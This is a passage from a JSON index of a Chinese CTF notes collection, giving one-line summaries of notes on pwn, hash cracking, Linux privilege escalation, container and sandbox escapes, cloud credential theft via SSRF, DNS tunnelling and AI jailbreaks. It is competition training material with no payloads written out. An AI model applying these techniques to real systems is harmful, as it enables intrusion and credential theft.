              "summary": '\u5185\u6838\u9898\u7684\u73AF\u5883\u51B3\u5B9A\u4E00\u5207\uFF1A\u5148\u8BFB\u542F\u52A8\u811A\u672C\u9489\u6B7B `KASLR/KPTI/SMEP/SMAP/oops`\uFF0C\u518D\u8C08\u6F0F\u6D1E\u9762\u4E0E\u8F7D\u8377\u3002\u8FD9\u9875\u7ED9\u51FA\u4ECE"\u89E3\u5305 rootfs"\u5230"\u63D0\u6743\u5E76\u5B89\u5168\u56DE\u5230\u7528\u6237\u6001"\u7684\u5B8C\u6574\u5224\u636E\u94FE\uFF0C\u7528\u6237\u6001\u624B\u6CD5\u5F52 [[Pwn-\u9AD8\u7EA7\u5229\u7528\u539F\u8BED]] \u4E0E [[Pwn-\u6808\u6EA2\u51FA\u4E0EROP]]\u3002'
            },
            {
              "name": "Pwn-\u6808\u6EA2\u51FA\u4E0EROP",
              "title": "Pwn-\u6808\u6EA2\u51FA\u4E0EROP",
              "summary": '\u6808\u8FD9\u6761\u7EBF\u7684\u5B8C\u6574\u65B9\u6CD5\u8BBA\uFF1A**\u5148\u7528 `checksec` \u8BFB\u51FA\u9898\u76EE\u5835\u6B7B\u4E86\u54EA\u6761\u8DEF\uFF0C\u518D\u51B3\u5B9A\u8D70 ret2text / ret2shellcode / ret2libc / ret2csu**\u3002\u672C\u7BC7\u53EA\u8BB2\u6808\u65B9\u5411\uFF08\u5806\u3001\u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u4E0E\u6C99\u7BB1\u5404\u5F52\u81EA\u5DF1\u7684\u7B14\u8BB0\uFF09\uFF0C\u4E3B\u7EBF\u662F"\u4FDD\u62A4 \u2192 \u8DEF\u7EBF"\u7684\u51B3\u7B56\u903B\u8F91\uFF0C\u4E0D\u662F\u80CC payload\u3002'
            }
          ]
        },
        {
          "id": "misc",
          "title": "\u6742\u9879",
          "notes": [
            {
              "name": "\u6742\u9879-\u78C1\u76D8\u4E0E\u5185\u5B58\u53D6\u8BC1",
              "title": "\u6742\u9879-\u78C1\u76D8\u4E0E\u5185\u5B58\u53D6\u8BC1",
              "summary": "\u62FF\u5230\u4E00\u4E2A\u955C\u50CF / \u4E00\u5757\u5185\u5B58\u8F6C\u50A8\uFF0C\u5148\u786E\u5B9A\u300C\u5B83\u662F\u4EC0\u4E48\u5BB9\u5668\u300D\uFF0C\u518D\u51B3\u5B9A\u8D70\u300C\u6587\u4EF6\u7CFB\u7EDF\u6062\u590D\u3001\u96D5\u53D6\u3001\u8FD8\u662F\u76F4\u63A5\u8BFB\u5185\u5B58\u300D\u3002\u8BEF\u5224\u6587\u4EF6\u7CFB\u7EDF\u6216\u5206\u533A\u8868\u662F\u8FD9\u7C7B\u9898\u6700\u5927\u7684\u65F6\u95F4\u6D6A\u8D39\u70B9\u3002"
            },
            {
              "name": "\u6742\u9879-\u53E3\u4EE4\u7834\u89E3\u4E0E\u54C8\u5E0C\u7206\u7834",
              "title": "\u6742\u9879-\u53E3\u4EE4\u7834\u89E3\u4E0E\u54C8\u5E0C\u7206\u7834",
              "summary": "\u9898\u91CC\u4E22\u7ED9\u4F60\u4E00\u4E32 32 \u4F4D\u5341\u516D\u8FDB\u5236\u3001\u4E00\u4E2A `/etc/shadow`\u3001\u4E00\u6BB5 `$krb5tgs$\u2026`\uFF0C\u6216\u4E00\u4E2A\u52A0\u5BC6\u538B\u7F29\u5305\uFF0C\u63A5\u4E0B\u6765\u600E\u4E48\u529E\u3002\u672C\u9875\u7ED9\u300C**\u5148\u5224\u54C8\u5E0C\u7C7B\u578B \u2192 \u518D\u9009\u653B\u51FB\u6A21\u5F0F \u2192 \u518D\u5B9A\u5DE5\u5177\u4E0E\u6A21\u5F0F\u53F7**\u300D\u7684\u56FA\u5B9A\u4E09\u6BB5\u5F0F\u3001\u4E00\u5F20\u300C\u770B\u5230\u4EC0\u4E48 \u21D2 \u7528\u54EA\u4E2A\u624B\u6CD5\u300D\u7684\u5224\u636E\u8868\uFF0C\u4EE5\u53CA hashcat / john / hydra \u53EF\u76F4\u63A5\u590D\u5236\u7684\u547D\u4EE4\u9AA8\u67B6\u3002\u843D\u70B9\u5728\u8BA4\u8BC1\u7C7B\u9898\uFF1A\u62FF\u5230\u54C8\u5E0C\u4E4B\u540E\u7684\u6700\u540E\u4E00\u6B65\u5E38\u662F\u8FD9\u9875\uFF08\u8BFB shadow \u7684\u524D\u63D0\u89C1 [[\u6742\u9879-Linux\u672C\u5730\u63D0\u6743]]\uFF09\u3002"
            },
            {
              "name": "\u6742\u9879-\u53D6\u8BC1\u4E0E\u6D41\u91CF\u5206\u6790",
              "title": "\u6742\u9879-\u53D6\u8BC1\u4E0E\u6D41\u91CF\u5206\u6790",
              "summary": 'Misc \u7684\u7B2C\u4E8C\u5927\u7C7B\uFF1A**\u7ED9\u4F60\u4E00\u4EFD"\u73B0\u573A"\uFF08\u6D41\u91CF\u5305\u3001\u5185\u5B58\u955C\u50CF\u3001\u78C1\u76D8\u3001\u65E5\u5FD7\uFF09\uFF0C\u8FD8\u539F\u53D1\u751F\u4E86\u4EC0\u4E48\u3001\u628A flag \u627E\u51FA\u6765\u3002**'
            },
            {
              "name": "\u6742\u9879-\u6C99\u7BB1\u9003\u9038-PyJail\u4E0ENodeJail",
              "title": "\u6742\u9879 \u6C99\u7BB1\u9003\u9038\uFF1APyJail \u4E0E NodeJail",
              "summary": "\u7ED9\u4F60\u4E00\u6BB5\u53D7\u9650\u7684\u4EE3\u7801\u6267\u884C\u73AF\u5883\uFF08\u8FC7\u6EE4\u4E86\u5173\u952E\u5B57 / \u7981\u4E86\u51FD\u6570\uFF09\uFF0C\u60F3\u529E\u6CD5\u8DF3\u51FA\u9650\u5236\u8BFB\u5230 flag\u3002Misc \u91CC\u7684\u7ECF\u5178\u96BE\u9898\u3002"
            },
            {
              "name": "\u6742\u9879-\u4FE1\u53F7\u4E0E\u786C\u4EF6\u53D6\u8BC1",
              "title": "\u6742\u9879-\u4FE1\u53F7\u4E0E\u786C\u4EF6\u53D6\u8BC1",
              "summary": "\u4ECE\u4E00\u6BB5\u6CE2\u5F62\u3001\u4E00\u5E27\u89C6\u9891\u6216\u4E00\u4E32 USB \u62A5\u6587\u91CC\u628A\u9690\u85CF\u4FE1\u606F\u62A0\u51FA\u6765\u3002\u6838\u5FC3\u52A8\u4F5C\u662F\u300C\u5148\u5224\u7C7B\uFF0C\u518D\u9009\u89E3\u7801\u5668\u300D\u2014\u2014\u97F3\u9891\u3001RF/SDR\u3001\u5916\u8BBE PCAP\u30013D \u6253\u5370\u3001\u5149\u76D8\u955C\u50CF\u4E94\u4E2A\u5B50\u95EE\u9898\u5404\u6709\u4E00\u5957\uFF0C\u522B\u770B\u6587\u4EF6\u540D\u50CF\u5C31\u786C\u5957\u540C\u4E00\u4E2A\u811A\u672C\u3002"
            },
            {
              "name": "\u6742\u9879-\u9690\u5199\u4E0E\u7F16\u7801",
              "title": "\u6742\u9879-\u9690\u5199\u4E0E\u7F16\u7801",
              "summary": 'Misc \u7684\u7B2C\u4E00\u5927\u7C7B\uFF1A**\u4FE1\u606F\u85CF\u5728"\u770B\u8D77\u6765\u6B63\u5E38\u7684\u4E1C\u897F"\u91CC**\u3002\u6838\u5FC3\u80FD\u529B\u662F\u2014\u2014\u62FF\u5230\u4E00\u4E2A\u6587\u4EF6\uFF0C\u5FEB\u901F\u95EE\u51FA"\u5B83\u662F\u771F\u7684\u56FE\u7247/\u97F3\u9891\u5417\uFF1F\u591A\u51FA\u6765\u7684\u90E8\u5206\u5728\u54EA\uFF1F"'
            },
            {
              "name": "\u6742\u9879-\u6E38\u620F\u4E0E\u865A\u62DF\u673A",
              "title": "\u6742\u9879-\u6E38\u620F\u4E0E\u865A\u62DF\u673A",
              "summary": 'Misc \u91CC"\u770B\u8D77\u6765\u50CF\u6E38\u620F/\u50CF\u4E00\u53F0\u673A\u5668"\u7684\u4E24\u7C7B\u9898\uFF1A\u4E00\u7C7B\u662F**\u4EA4\u4E92\u5F0F\u6E38\u620F**\uFF08\u8981\u8D62\u3001\u8981\u6700\u4F18\u7B56\u7565\u3001\u6216\u538B\u6839\u4E0D\u8D70\u6B63\u8DEF\uFF09\uFF0C\u4E00\u7C7B\u662F**\u81EA\u5B9A\u4E49 VM/\u5B57\u8282\u7801**\uFF08\u5148\u53CD\u6C47\u7F16\u6210\u4F2A\u7801\u518D\u89E3\u9898\uFF09\u3002\u8FD9\u9875\u5148\u6559\u5206\u7C7B\uFF0C\u518D\u7ED9\u5224\u636E\u548C\u9AA8\u67B6\u3002'
            },
            {
              "name": "\u6742\u9879-BashJail\u4E0E\u53D7\u9650Shell",
              "title": "\u6742\u9879-BashJail\u4E0E\u53D7\u9650Shell",
              "summary": "\u628A\u4E00\u4E2A shell \u5173\u8FDB\u7B3C\u5B50\uFF1A\u6216\u8FC7\u6EE4\u8F93\u5165\u5B57\u7B26\u3001\u6216\u53EA\u7559\u4E00\u6761 `eval` \u7F1D\u3001\u6216\u5E72\u8106\u53EA\u7ED9\u4F60 rvim/ed\u3002\u8FD9\u9875\u56DE\u7B54\u4E09\u4EF6\u4E8B\u2014\u2014\u7B3C\u5B50\u957F\u4EC0\u4E48\u6837\u3001\u7528\u54EA\u6761\u624B\u6CD5\u64AC\u3001\u64AC\u5F00\u540E\u600E\u4E48\u8BFB\u88AB\u7981\u7684\u6587\u4EF6\u3002"
            },
            {
              "name": "\u6742\u9879-DNS\u4E0E\u7F51\u7EDC\u602A\u9898",
              "title": "\u6742\u9879-DNS\u4E0E\u7F51\u7EDC\u602A\u9898",
              "summary": "\u4E24\u5757\u5185\u5BB9\uFF1A\u4E00\u662F**\u628A DNS \u5F53\u4FE1\u9053**\uFF08\u96A7\u9053\u3001\u5916\u5E26\u3001\u9690\u853D\u4F20\u8F93\uFF09\uFF0C\u4E8C\u662F**\u628A DNS/\u534F\u8BAE\u672C\u8EAB\u7684\u8BED\u4E49\u5F53\u9898**\uFF08zone transfer\u3001rebinding\u3001\u63E1\u624B\u602A\u7656\uFF09\u3002\u672B\u5C3E\u9644 CTFd \u5E73\u53F0\u7684\u65E0\u6D4F\u89C8\u5668\u5BFC\u822A\u2014\u2014\u6BD4\u8D5B\u4E2D\u4E0D\u70B9\u9F20\u6807\u4E5F\u80FD\u67E5\u9898\u3001\u4E0B\u9644\u4EF6\u3001\u4EA4 flag\u3002"
            },
            {
              "name": "\u6742\u9879-Linux\u672C\u5730\u63D0\u6743",
              "title": "\u6742\u9879-Linux\u672C\u5730\u63D0\u6743",
              "summary": '\u5DF2\u7ECF\u62FF\u5230\u4E00\u4E2A\u666E\u901A\u7528\u6237\u7684 shell\uFF0C\u600E\u4E48\u53D8\u6210 root\u3002\u8FD9\u9875\u7ED9\u4E00\u5F20"**\u6309\u987A\u5E8F\u67E5\u4EC0\u4E48**"\u7684\u6E05\u5355\u3001\u4E00\u5F20"**\u770B\u5230\u4EC0\u4E48 \u21D2 \u7528\u54EA\u4E2A\u624B\u6CD5**"\u7684\u5224\u636E\u8868\uFF0C\u4EE5\u53CA SUID / sudo / cron / docker / capabilities / ACL \u516D\u6761\u4E3B\u7EBF\u7684\u53EF\u8DD1\u9AA8\u67B6\u3002\u9003\u51FA bash jail \u4E4B\u540E\u7684\u843D\u70B9\u5E38\u662F\u8FD9\u9875\uFF08\u89C1 [[\u6742\u9879-BashJail\u4E0E\u53D7\u9650Shell]]\uFF09\u3002'
            },
            {
              "name": "\u6742\u9879-Windows\u4E0ELinux\u4E3B\u673A\u53D6\u8BC1",
              "title": "\u6742\u9879-Windows\u4E0ELinux\u4E3B\u673A\u53D6\u8BC1",
              "summary": "\u4ECE\u4E00\u53F0\u300C\u62F7\u51FA\u6765\u7684\u4E3B\u673A\u300D\uFF08\u955C\u50CF\u3001KAPE \u4E09\u53D6\u8BC1\u5305\u3001\u65E5\u5FD7\u76EE\u5F55\uFF09\u8FD8\u539F\u300C\u8C01\u3001\u4EC0\u4E48\u65F6\u5019\u3001\u505A\u4E86\u4EC0\u4E48\u300D\u3002\u6838\u5FC3\u662F**\u591A\u6765\u6E90\u4EA4\u53C9\u9A8C\u8BC1**\uFF1A\u653B\u51FB\u8005\u80FD\u6E05\u4E8B\u4EF6\u65E5\u5FD7\uFF0C\u4F46\u6E05\u4E0D\u6389 USN \u65E5\u5FD7\u3001MFT\u3001Prefetch\u3001Defender \u65E5\u5FD7\u548C\u6CE8\u518C\u8868\u65F6\u95F4\u6233\u3002"
            }
          ]
        },
        {
          "id": "other",
          "title": "\u4E91 \xB7 \u5BB9\u5668 \xB7 \u5176\u4ED6",
          "notes": [
            {
              "name": "\u533A\u5757\u94FE-\u667A\u80FD\u5408\u7EA6\u5B89\u5168",
              "title": "\u533A\u5757\u94FE-\u667A\u80FD\u5408\u7EA6\u5B89\u5168",
              "summary": "CTF \u91CC\u7684\u533A\u5757\u94FE/\u667A\u80FD\u5408\u7EA6\u9898\u600E\u4E48\u6253\uFF1A\u9898\u76EE\u7ED9\u4E00\u4EFD `.sol` \u6E90\u7801\u52A0\u4E00\u4E2A RPC \u8282\u70B9\uFF0C\u76EE\u6807\u901A\u5E38\u662F\u8BA9 `isSolved()` \u8FD4\u56DE true\uFF08\u6216\u628A\u5408\u7EA6\u4F59\u989D\u6E05\u96F6\uFF09\u3002\u672C\u9875\u7ED9\u89E3\u9898\u8303\u5F0F\u3001\u5341\u7C7B\u9AD8\u9891\u6F0F\u6D1E\u7684\u539F\u7406\u4E0E\u4EE3\u7801\u9AA8\u67B6\u3001EVM \u5C42\u8003\u70B9\uFF0C\u4EE5\u53CA\u672C\u673A\u73AF\u5883\u4E0B\u7684\u5DE5\u5177\u94FE\u3002"
            },
            {
              "name": "\u5BB9\u5668\u9003\u9038\u6280\u672F",
              "title": "\u5BB9\u5668\u9003\u9038\u6280\u672F",
              "summary": '\u5DF2\u7ECF\u5728\u5BB9\u5668\u91CC\uFF08Docker / LXC / K8s Pod\uFF09\uFF0C\u600E\u4E48\u6478\u5230\u5BBF\u4E3B\u3002\u6838\u5FC3\u4E0D\u662F"\u4E0A\u53BB\u5C31\u8BD5\u6F0F\u6D1E"\uFF0C\u800C\u662F\u5148\u7B54\u4E24\u95EE\u2014\u2014**\u6211\u5728\u4EC0\u4E48\u5BB9\u5668\u91CC\u3001\u6211\u6709\u4EC0\u4E48\u6743\u9650**\u2014\u2014\u518D\u7167\u5224\u636E\u8868\u9009\u94FE\u3002\u672C\u9875\u7B2C\u4E00\u6761\u8981\u7834\u9664\u7684\u8BEF\u89E3\uFF1A**\u5BB9\u5668\u5185 root \u2260 \u5BBF\u4E3B root**\uFF08\u89C1\u7B2C\u516B\u8282\uFF09\u3002'
            },
            {
              "name": "\u65E0\u7EBF\u4E0E\u5C04\u9891\u5B89\u5168",
              "title": "\u65E0\u7EBF\u4E0E\u5C04\u9891\u5B89\u5168",
              "summary": '\u65E0\u7EBF\u9898\u53EA\u6709\u56DB\u79CD"\u73B0\u573A"\uFF1A\u4E00\u6BB5 Wi-Fi \u6293\u5305\u3001\u4E00\u6BB5\u84DD\u7259\u62A5\u6587\u3001\u4E00\u5F20 RFID \u5361\u3001\u4E00\u6BB5 IQ/433M \u91C7\u6837\u3002\u5148\u7528\u5224\u636E\u8868\u8BA4\u73B0\u573A\uFF0C\u518D\u5957\u5BF9\u5E94\u90A3\u6761\u56FA\u5B9A\u6D41\u6C34\u7EBF\u2014\u2014\u7B54\u6848\u591A\u6570\u5728"**\u79BB\u7EBF\u7834\u89E3**"\u6216"**\u91CD\u653E**"\u91CC\uFF0C\u800C\u4E0D\u662F\u771F\u5B9E\u786C\u4EF6\u7684\u5B9E\u65F6\u4EA4\u4E92\u91CC\u3002'
            },
            {
              "name": "\u79FB\u52A8\u4E0EIoT\u5B89\u5168",
              "title": "\u79FB\u52A8\u4E0EIoT\u5B89\u5168",
              "summary": '\u4E00\u53E5\u8BDD\u6458\u8981\uFF1ACTF \u91CC"\u79FB\u52A8\u7AEF"\u548C"IoT/\u786C\u4EF6"\u4E24\u6761\u7EBF\u7684\u5B8C\u6574\u6253\u6CD5\u2014\u2014APK/IPA \u4ECE\u62C6\u5305\u5230\u52A8\u6001 hook\uFF0C\u56FA\u4EF6\u4ECE `binwalk` \u62C6\u5305\u5230\u6A21\u62DF\u6267\u884C\u4E0E\u63A5\u53E3\u5BA1\u8BA1\uFF0C\u4EE5\u53CA\u5B83\u4EEC\u5171\u7528\u7684"\u627E\u51ED\u636E \u2192 \u627E\u63A5\u53E3 \u2192 \u627E\u5371\u9669\u6C47\u805A\u70B9"\u65B9\u6CD5\u8BBA\u3002'
            },
            {
              "name": "\u4E91\u5B89\u5168-\u5E38\u89C1\u653B\u51FB\u9762",
              "title": "\u4E91\u5B89\u5168-\u5E38\u89C1\u653B\u51FB\u9762",
              "summary": 'CTF \u91CC\u7684"\u4E91"\u9898\uFF1A\u76EE\u6807\u901A\u5E38\u662F\u4E00\u53F0\u8DD1\u5728\u4E91\u4E0A\u7684 Web / \u5BB9\u5668\uFF0C\u6838\u5FC3\u5957\u8DEF\u662F **SSRF \u6478\u5143\u6570\u636E \u2192 \u5077 IAM \u51ED\u636E \u2192 \u6A2A\u5411\u5230\u5B58\u50A8 / \u51FD\u6570 / \u96C6\u7FA4**\uFF0C\u6700\u540E\u8BFB\u5230 flag\u3002'
            },
            {
              "name": "\u4E91\u5B89\u5168-AWS\u6E17\u900F\u5B9E\u6218",
              "title": "\u4E91\u5B89\u5168-AWS\u6E17\u900F\u5B9E\u6218",
              "summary": '\u5DF2\u7ECF\u62FF\u5230\u4E00\u7EC4 AWS \u51ED\u636E\uFF08\u957F\u671F AK/SK\uFF0C\u6216 SSRF \u6253\u5230 IMDS \u6362\u6765\u7684\u4E34\u65F6 ASIA \u51ED\u636E\uFF09\u4E4B\u540E\u600E\u4E48\u6A2A\u5411\uFF1A\u5148\u95EE"\u6211\u662F\u8C01\u3001\u6211\u80FD\u5E72\u4EC0\u4E48"\uFF0C\u518D\u6309\u6743\u9650\u9010\u6761\u8BD5\u63D0\u6743\u8DEF\u5F84\uFF0C\u6700\u540E\u843D\u5230 S3 / Secrets / Lambda / SSM \u91CC\u8BFB\u6570\u636E\u3002\u672C\u9875\u662F [[\u4E91\u5B89\u5168-\u5E38\u89C1\u653B\u51FB\u9762]] \u7684"\u540E\u534A\u7A0B"\u5C55\u5F00\u3002'
            },
            {
              "name": "AI-ML\u5B89\u5168",
              "title": "AI / ML \u5B89\u5168",
              "summary": '\u6253\u6A21\u578B\u672C\u8EAB\uFF1A\u63D0\u793A\u8BCD\u6CE8\u5165\u3001\u8D8A\u72F1\u3001\u6A21\u578B\u7A83\u53D6\u3001\u5BF9\u6297\u6837\u672C\u3001\u6570\u636E\u6295\u6BD2\u3001\u6210\u5458\u63A8\u65AD\u3002CTF \u91CC AI \u9898\u8FD1\u51E0\u5E74\u624D\u591A\u8D77\u6765\uFF0C\u5E73\u53F0\u5E38\u5355\u5217\u4E3A "AI" \u65B9\u5411\u3002'
            },
            {
              "name": "CTF-\u591A\u667A\u80FD\u4F53\u534F\u4F5C",
              "title": "CTF-\u591A\u667A\u80FD\u4F53\u534F\u4F5C",
              "summary": "\u628A\u4E00\u9053\uFF08\u6216\u4E00\u4E32\uFF09\u9898\u540C\u65F6\u4EA4\u7ED9\u591A\u4E2A\u4E92\u4E0D\u5171\u4EAB\u4E0A\u4E0B\u6587\u7684 AI \u4EE3\u7406\u5E76\u884C\u653B\uFF1A\u4E3B\u7EBF\u505A\u4FA6\u5BDF\u3001\u5199\u7B80\u62A5\u3001\u8C03\u5EA6\u4E0E\u63D0\u4EA4\uFF0C\u5404\u4EE3\u7406\u8D70**\u4E0D\u540C**\u6280\u672F\u8DEF\u7EBF\u30022026-06 \u9752\u5C91\u9898\u96C6 71 \u9996\u6218\u6210\u578B\uFF088\u21929 \u9898 / 2,966 \u5206\uFF09\uFF0C\u968F\u540E\u5E76\u5165 0xGame2025 \u653B\u9898\u7EC4\u3002"
            },
            {
              "name": "CTF-\u7ADE\u8D5B\u603B\u89C8\u4E0E\u89E3\u9898\u6D41\u7A0B",
              "title": "CTF \u7ADE\u8D5B\u603B\u89C8\u4E0E\u89E3\u9898\u6D41\u7A0B",
              "summary": 'CTF\uFF08Capture The Flag\uFF09\u662F\u7F51\u7EDC\u5B89\u5168\u593A\u65D7\u8D5B\uFF1A\u89E3\u9898\u62FF flag \u5F97\u5206\u3002\u8FD9\u9875\u662F**\u5168\u5E93\u5165\u53E3**\uFF0C\u56DE\u7B54"CTF \u662F\u4EC0\u4E48\u3001\u6709\u54EA\u51E0\u7C7B\u9898\u3001\u62FF\u5230\u4E00\u9898\u4ECE\u54EA\u4E0B\u624B"\u3002'
            },
            {
              "name": "Docker-Registry\u4E0E\u8FDC\u7A0BAPI\u5229\u7528",
              "title": "Docker Registry \u4E0E\u8FDC\u7A0B API \u5229\u7528",
              "summary": "\u5BB9\u5668\u73AF\u5883\u9898\u7684\u6807\u914D\uFF1A**\u62FF\u5230\u4E00\u4E2A\u5BB9\u5668\u4E4B\u540E\uFF0C\u771F\u6B63\u7684 flag \u5F80\u5F80\u5728\u53E6\u4E00\u4E2A\u5BB9\u5668/\u5185\u90E8\u670D\u52A1\u91CC\u3002** \u8FD9\u9875\u8BB2\u5BB9\u5668\u95F4\u6A2A\u5411\u7684\u4E09\u6761\u4E3B\u8981\u8DEF\u5F84\u3002"
            },
            {
              "name": "OSINT-\u5F00\u6E90\u60C5\u62A5",
              "title": "OSINT \u5F00\u6E90\u60C5\u62A5",
              "summary": "\u53EA\u7528\u516C\u5F00\u4FE1\u606F\u628A\u4EBA / \u5730\u70B9 / \u4E8B\u4EF6\u67E5\u6E05\u695A\u3002CTF \u91CC\u5E38\u662F Misc \u7684\u4E00\u7C7B\u9898\uFF08\u5982\u822A\u7A7A OSINT \u53D6\u8BC1\u3001\u56FE\u7247\u5B9A\u4F4D\uFF09\u3002"
            }
          ]
        }
      ]
    },
    {
      "id": "project",
      "title": "\u9879\u76EE",
      "groups": [
        {
          "id": "project",
          "title": "\u9879\u76EE",
          "notes": [
            {
              "name": "0xGame2025-\u5F81\u6218\u8BB0\u5F55",
              "title": "0xGame2025-\u5F81\u6218\u8BB0\u5F55",
              "summary": '2026-06 \u5728\u9752\u5C91\u6253\u7684\u5B8C\u6574 CTF \u6218\u5F79\uFF0C\u4E5F\u662F"\u591A\u667A\u80FD\u4F53\u534F\u4F5C"\u7B2C\u4E00\u6B21\u5168\u6D41\u7A0B\u5B9E\u6218\u3002**\u6218\u7EE9\uFF1A\u9898\u96C6\u5408\u8BA1\u7EA6 74 \u9898**\uFF08PS70 23/92\u3001PS71 10/11\u3001PS72 34/95\u3001PS80 7/7\uFF09\uFF0C\u5355\u9898\u96C6\u66FE\u5230 8168 \u5206 / \u699C #7\u3002\u8FD9\u9875\u8BB0\u6253\u6CD5\u3001\u9898\u76EE\u4E0E\u6559\u8BAD\u3002'
            },
            {
              "name": "\u4E03\u5915\u8D5B\u9898-\u4E03\u788E\u7247\u6218\u8BB0",
              "title": "\u4E03\u5915\u8D5B\u9898-\u4E03\u788E\u7247\u6218\u8BB0",
              "summary": "2026-08-25 ~ 08-26 \u8DE8\u5929\u4F1A\u6218\u7684\u4E00\u9053\u4E03\u5915\u4E3B\u9898\u591A\u9636\u6BB5 Misc+Crypto \u9898\uFF08\u8D21\u732E\u8005 VMV\uFF0C\u79C1\u4EBA\u8D5B\u4E8B\uFF09\uFF1A**4 \u5C42\u5DF2\u7834\u30013 \u5C42\u5361\u6B7B**\uFF0C\u6700\u7EC8\u672A\u62FF flag\uFF0C\u4F46\u7559\u4E0B\u4E86\u5B8C\u6574\u7684\u6392\u9664\u6CD5\u8BB0\u5F55\u4E0E\u53EF\u590D\u7528\u7ECF\u9A8C\u3002\u8FD9\u662F\u552F\u4E00\u4E00\u573A\u672A\u6253\u5B8C\u5C31\u4E2D\u65AD\u7684\u5927\u578B\u6218\u5F79\u3002"
            },
            {
              "name": "\u5176\u4ED6\u8D5B\u4E8B\u9898\u89E3\u5C65\u5386",
              "title": "\u5176\u4ED6\u8D5B\u4E8B\u9898\u89E3\u5C65\u5386",
              "summary": "\u4E3B\u5E73\u53F0\u4E4B\u5916\u7684\u6240\u6709\u5B9E\u6218\uFF1ALitCTF/Cyclens\u3001ISCC\u3001MoeCTF\u3001NepCTF\uFF0C\u4EE5\u53CA\u9006\u5411/\u56FA\u4EF6/\u9690\u5199\u4E13\u9879\u3002**\u6BCF\u9898\u4E00\u884C\uFF0C\u5B8C\u6574 writeup \u5728 `~/CTF/writeups/` \u4E0E\u535A\u5BA2\u3002**"
            },
            {
              "name": "\u9752\u5C91-License\u6388\u6743\u7BA1\u7406\u7CFB\u7EDF",
              "title": "\u9752\u5C91-License\u6388\u6743\u7BA1\u7406\u7CFB\u7EDF",
              "summary": "\u4E3B\u4EBA\u5728 **ctf.qingcen.net** \u4E0A\u505A\u7684\u9898\uFF1A`\u9752\u5C91 \xB7 License \u6388\u6743\u7BA1\u7406\u7CFB\u7EDF`\uFF08SRC \u7C7B\uFF0C500 \u5206\uFF09\u3002**\u5F53\u524D\u5361\u70B9\uFF1A\u7B2C\u4E8C\u6BB5\u5BB9\u5668\uFF08License \u670D\u52A1\uFF09\u7684\u5BC6\u94A5\u4E0E\u6570\u636E\u683C\u5F0F\u3002**"
            },
            {
              "name": "\u9752\u5C91\u4E0ECTFShow-\u9898\u89E3\u5C65\u5386",
              "title": "\u9752\u5C91\u4E0ECTFShow-\u9898\u89E3\u5C65\u5386",
              "summary": '\u4E3B\u4EBA\u5728\u4E24\u4E2A\u4E3B\u5E73\u53F0\uFF08\u9752\u5C91 / CTFShow\uFF09\u89E3\u8FC7\u7684\u9898\u7D22\u5F15\uFF1A**\u6BCF\u9898\u4E00\u884C"\u662F\u4EC0\u4E48 + \u600E\u4E48\u6253"**\uFF0C\u7EC6\u8282\u5728\u5BF9\u5E94 writeup / \u535A\u5BA2\u91CC\u3002\u65F6\u95F4\u8DE8\u5EA6 2026-02 \uFF5E 2026-09\u3002'
            },
            {
              "name": "CTF-\u5B9E\u6218\u89E3\u9898\u6848\u4F8B\u96C6",
              "title": "CTF-\u5B9E\u6218\u89E3\u9898\u6848\u4F8B\u96C6",
              "summary": "\u4ECE 9 \u7BC7\u771F\u5B9E writeup \u4E0E\u4E3B\u4EBA\u5B9E\u6218\u8BB0\u5F55\u91CC\u62BD\u51FA\u300C\u5361\u70B9 \u2192 \u8BC1\u636E \u2192 payload \u2192 \u53EF\u8FC1\u79FB\u6253\u6CD5\u300D\u7684\u95ED\u73AF\uFF0C\u7528\u6765\u5728\u4E0B\u4E00\u9053\u540C\u7C7B\u9898\u91CC\u5FEB\u901F\u5224\u65AD\u8BE5\u5F80\u54EA\u4E2A\u65B9\u5411\u649E\u3002"
            },
            {
              "name": "CTF\u535A\u5BA2-\u5EFA\u8BBE\u4E0E\u90E8\u7F72",
              "title": "CTF\u535A\u5BA2-\u5EFA\u8BBE\u4E0E\u90E8\u7F72",
              "summary": '\u4E3B\u4EBA\u7684\u4E2A\u4EBA writeup \u535A\u5BA2\uFF08`heliumsenbrg.github.io/ctf-writeup-blog`\uFF09\uFF1AReact 18 + Vite + Tailwind\uFF0C\u6587\u7AE0\u6570\u636E\u9A71\u52A8\u3001GitHub Actions \u81EA\u52A8\u4E0A\u7EBF\u3002**\u88AB"\u6539\u4E86\u770B\u4E0D\u5230"\u5751\u8FC7\u591A\u6B21**\u2014\u2014\u8FD9\u9875\u8BB0\u7ED3\u6784\u3001\u90E8\u7F72\u94FE\u548C\u5751\u3002'
            }
          ]
        }
      ]
    },
    {
      "id": "output",
      "title": "\u8F93\u51FA",
      "groups": [
        {
          "id": "output",
          "title": "\u8F93\u51FA",
          "notes": [
            {
              "name": "\u534F\u4F5C\u9644\u5F55-\u975ECTF\u4E8B\u9879\u4E0E\u5B58\u6863\u5BFC\u89C8",
              "title": "\u534F\u4F5C\u9644\u5F55-\u975ECTF\u4E8B\u9879\u4E0E\u5B58\u6863\u5BFC\u89C8",
              "summary": "\u4E24\u4EF6\u5728\u522B\u5904\u6CA1\u6536\u5F55\u7684\u4E8B\uFF1A**\u2460 \u6211\u4EEC\u9664\u4E86 CTF \u8FD8\u4E00\u8D77\u505A\u8FC7\u4EC0\u4E48\uFF1B\u2461 \u5168\u90E8\u534F\u4F5C\u4EA7\u7269\u5B58\u5728\u54EA\u3002** \u89C4\u5219\u4E0E\u504F\u597D\u89C1 [[\u5BF9\u8BDD\u7EAA\u8981-\u7CEF\u7C73\u4E0E\u4E3B\u4EBA]]\uFF1B\u9010\u4F1A\u8BDD\u5386\u53F2\u89C1 [[\u4F1A\u8BDD\u5168\u8BB0\u5F55-199\u6B21\u5BF9\u8BDD]]\u3002"
            },
            {
              "name": "CTF-\u77E5\u8BC6\u4F53\u7CFB\u901F\u67E5\u624B\u518C",
              "title": "CTF \u77E5\u8BC6\u4F53\u7CFB\u901F\u67E5\u624B\u518C",
              "summary": "\u4E00\u9875\u7EB8\u7684\u603B\u89C8\uFF1A\u5404\u65B9\u5411 + \u6838\u5FC3 checklist\uFF0C\u8003\u524D / \u5F00\u5C40\u5FEB\u901F\u8FC7\u4E00\u904D\u3002"
            },
            {
              "name": "CTF-\u77E5\u8BC6\u4E0E\u5BF9\u8BDD\u603B\u7D22\u5F15",
              "title": "CTF \u77E5\u8BC6\u4E0E\u5BF9\u8BDD\u603B\u7D22\u5F15",
